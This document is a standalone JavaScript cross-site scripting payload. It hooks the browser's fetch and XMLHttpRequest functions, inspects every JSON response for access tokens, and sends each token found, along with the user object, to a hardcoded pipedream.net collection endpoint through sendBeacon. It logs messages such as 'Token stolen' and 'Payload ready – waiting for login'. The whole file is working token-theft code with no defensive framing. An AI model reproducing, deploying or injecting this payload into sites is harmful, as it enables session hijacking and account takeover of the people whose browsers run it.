(function() {
    var EXFIL = 'https://6b884da34ac52d711d2d20ef6f2bf068.m.pipedream.net';

    function steal(data) {
        var token = data.access_token || data.token || data.accessToken;
        if (token) {
            navigator.sendBeacon(EXFIL, JSON.stringify({ token: token, user: data.user }));
            console.log('[XSS] Token stolen:', token);
        }
    }

    // Hook fetch()
    var origFetch = window.fetch;
    window.fetch = function() {
        var args = arguments;
        return origFetch.apply(this, args).then(function(response) {
            var clone = response.clone();
            clone.json().then(steal).catch(function() {});
            return response;
        });
    };

    // Hook XMLHttpRequest
    var origOpen = XMLHttpRequest.prototype.open;
    var origSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.open = function(method, url) {
        this._url = url;
        return origOpen.apply(this, arguments);
    };
    XMLHttpRequest.prototype.send = function(body) {
        var self = this;
        this.addEventListener('load', function() {
            if (self.status === 200) {
                try {
                    var data = JSON.parse(self.responseText);
                    steal(data);
                } catch(e) {}
            }
        });
        return origSend.apply(this, arguments);
    };

    console.log('[XSS] Payload ready – waiting for login...');
})();
